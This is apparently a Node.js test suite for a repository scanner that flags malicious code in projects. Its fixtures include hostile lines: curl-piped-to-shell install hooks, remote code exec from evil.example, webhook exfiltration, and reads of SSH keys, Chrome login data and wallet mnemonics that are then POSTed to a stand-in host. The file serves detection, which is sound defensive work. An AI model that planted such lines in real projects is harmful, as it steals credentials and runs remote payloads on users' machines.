import { test } from "node:test";
import assert from "node:assert/strict";
import { scanRepo, LEVEL } from "../extension/src/lib/repo-scan.js";

const scan = (path, content) => scanRepo([{ path, content }]);
const rules = (r) => r.findings.map((f) => f.rule);

test("clean project yields no findings", () => {
	const r = scanRepo([
		{ path: "package.json", content: JSON.stringify({ scripts: { test: "node --test", build: "tsc" }, dependencies: { express: "^4.19.0" } }) },
		{ path: "src/app.js", content: "import express from 'express';\nconst app = express();\napp.listen(3000);\n" },
	]);
	assert.equal(r.level, LEVEL.NONE);
	assert.deepEqual(r.findings, []);
});

test("postinstall that downloads is high; plain prepare is medium", () => {
	const bad = scan("package.json", JSON.stringify({ scripts: { postinstall: "curl -s https://x.example/a.sh | sh" } }, null, 1));
	assert.equal(bad.level, LEVEL.DANGER);
	assert.equal(bad.findings[0].rule, "install_hook");
	const ok = scan("package.json", JSON.stringify({ scripts: { prepare: "husky install" } }));
	assert.equal(ok.level, LEVEL.WARN);
});

test("git/url dependencies are flagged", () => {
	const r = scan("package.json", JSON.stringify({ dependencies: { "left-pad": "github:someone/left-pad" } }));
	assert.deepEqual(rules(r), ["remote_dependency"]);
});

test("eval of base64 is high", () => {
	const r = scan("server/config.js", "eval(Buffer.from('ZGVidWc=', 'base64').toString());");
	assert.equal(r.level, LEVEL.DANGER);
	assert.ok(rules(r).includes("decode_exec"));
});

test("python exec of remote code is high", () => {
	const r = scan("util.py", "exec(requests.get('https://evil.example/p').text)");
	assert.ok(rules(r).includes("remote_code_load"));
});

test("discord webhook exfil is high", () => {
	const r = scan("a.js", "fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body })");
	assert.ok(rules(r).includes("exfil_webhook"));
	assert.equal(r.level, LEVEL.DANGER);
});

test("sensitive path alone is medium, with network in same file is high", () => {
	const alone = scan("a.js", "const p = path.join(os.homedir(), '.ssh', 'id_rsa');");
	assert.equal(alone.level, LEVEL.WARN);
	const stealer = scan("b.js", "const k = fs.readFileSync(home + '/.ssh/id_rsa');\nfetch('https://x.example', { method: 'POST', body: k });");
	assert.equal(stealer.level, LEVEL.DANGER);
});

test("vscode folderOpen auto-run task is high", () => {
	const r = scan(".vscode/tasks.json", '{"tasks":[{"label":"x","command":"node s.js","runOptions":{"runOn":"folderOpen"}}]}');
	assert.ok(rules(r).includes("vscode_autorun"));
	assert.equal(r.level, LEVEL.DANGER);
});

test("obfuscator signature is high", () => {
	const r = scan("x.js", "var _0x1a2b=['a'];function _0x3c4d(_0x5e6f){return _0x1a2b[_0x5e6f];}");
	assert.ok(rules(r).includes("obfuscator_signature"));
});

test("huge base64 blob on one line is flagged without regex-scanning it all", () => {
	const r = scan("blob.js", `var d='${"A".repeat(5000)}';`);
	assert.deepEqual(rules(r), ["long_blob"]);
});

test("skips node_modules, lockfiles, binaries", () => {
	const r = scanRepo([
		{ path: "node_modules/x/index.js", content: "eval(atob('x'))" },
		{ path: "package-lock.json", content: '{"resolved":"https://1.2.3.4/x"}' },
		{ path: "logo.png", content: "eval(atob('x'))" },
	]);
	assert.equal(r.level, LEVEL.NONE);
	assert.equal(r.skipped, 3);
});

test("shell command pipeline in a spawn call is flagged; a bare execSync('ls') is not", () => {
	assert.ok(rules(scan("a.js", "execSync('curl -s https://x.example | bash')")).length > 0);
	assert.deepEqual(rules(scan("b.js", "execSync('ls -la')")), []);
});

// Regression: a real Next.js + Puppeteer + Supabase project produced all of these as false alarms.
test("web-app cookie APIs are not browser cookie theft", () => {
	const lines = [
		'const cookie = res.cookies.get("admin_session");',
		'res.cookies.set("admin_session", "", { path: "/", httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "lax", maxAge: 0 });',
		'serverClient.mockRejectedValue(new Error("cookies() outside a request"));',
	];
	for (const l of lines) assert.deepEqual(rules(scan("src/app/api/auth/route.ts", l)), [], l);
});

test("bare eval, Puppeteer $$eval and regex exec are not reported", () => {
	for (const l of ["const t = await page.$$eval('*', els => els.length);", "const v = eval(code);", "const m = re.exec(text);", "const f = new Function('a', 'return a');"]) {
		assert.deepEqual(rules(scan("x.mjs", l)), [], l);
	}
});

test("eval of decoded or remote input is still high", () => {
	assert.ok(rules(scan("a.js", "eval(atob(payload))")).includes("decode_exec"));
	assert.ok(rules(scan("a.js", "new Function(atob(payload))()")).includes("decode_exec"));
	assert.ok(rules(scan("a.js", "eval(await (await fetch(u)).text())")).includes("remote_code_load"));
});

test("SheetJS CDN dependency is trusted; unknown URL and github shorthand are not", () => {
	const dep = (spec) => scan("package.json", JSON.stringify({ dependencies: { xlsx: spec } }));
	assert.deepEqual(rules(dep("https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz")), []);
	assert.deepEqual(rules(dep("https://evil.example/x.tgz")), ["remote_dependency"]);
	assert.deepEqual(rules(dep("github:someone/xlsx")), ["remote_dependency"]);
	assert.deepEqual(rules(dep("file:../local-pkg")), []);
});

test("link-local and private IPs (SSRF tests, local dev) are not exfil; public raw IPs are", () => {
	assert.deepEqual(rules(scan("t.test.ts", 'await fetchImageAsReference("http://169.254.169.254/latest/meta-data")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://192.168.1.10:3000/api")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://127.0.0.1:8080/")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://45.61.12.9:8080/upload")')), ["exfil_endpoint"]);
});

test("browser profile theft is still caught; bare mnemonic needs a file read plus network", () => {
	const steal = scan("s.js", "const db = path.join(home, 'AppData/Local/Google/Chrome/User Data/Default/Login Data');\nfetch('https://x.example', { method: 'POST', body: db });");
	assert.equal(steal.level, LEVEL.DANGER);
	assert.deepEqual(rules(scan("w.js", "const mnemonic = generateMnemonic();")), []);
	assert.equal(scan("w.js", "const m = fs.readFileSync('mnemonic.txt');\nfetch('https://x.example', { method: 'POST', body: m });").level, LEVEL.DANGER);
});
